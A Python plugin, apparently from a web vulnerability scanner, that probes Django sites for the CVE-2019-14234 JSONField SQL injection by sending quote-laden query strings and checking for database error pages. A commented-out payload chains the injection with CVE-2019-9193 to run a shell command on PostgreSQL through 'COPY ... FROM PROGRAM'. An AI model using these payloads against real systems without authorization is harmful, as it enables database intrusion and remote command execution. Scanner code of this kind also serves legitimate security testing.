#!/usr/bin/env python3
# -*- coding:utf-8 -*-

# from lib.tool import check

cve_2019_14234_payloads = [
    {'path': '{URLCONF}/?detail__a\'b=123'},
    # {'path': 'admin/vuln/collection/?detail__a\'b=123'},
    # {'path': 'vuln/collection/?detail__a\'b=123'},
    # {'path': 'collection/?detail__a\'b=123'},
    # {'path': '?detail__a\'b=123'},
    # {   # * 配合CVE-2019-9193完成Getshell
    #     'path': "?detail__title')%3d'1' or 1%3d1 %3bcopy cmd_exec FROM PROGRAM 'touch /tmp/test.txt'--%20",
    # }
]

def cve_2019_14234_scan(self, clients):
    ''' Django JSONfield sql注入漏洞
            需要登录, 并进入当前用户的目录下
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'SQLinject',
        'vul_id': 'CVE-2019-14234',
    }
    
    urlConfList = self.get_urlconf(client, vul_info)     # * 获取Django定义的URL路径
    if not urlConfList:
        return None

    for payload in cve_2019_14234_payloads:
        for urlConf in urlConfList:
            path = payload['path'].format(URLCONF=urlConf)
            url = client.protocol_domain + '/'

            res = client.request(
                'get',
                url + path,
                vul_info=vul_info
            )
            if res is None:
                continue

            if (('ProgrammingError' in res.text) or ('Request information' in res.text)):
                results = {
                    'Target': res.request.url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
    return None
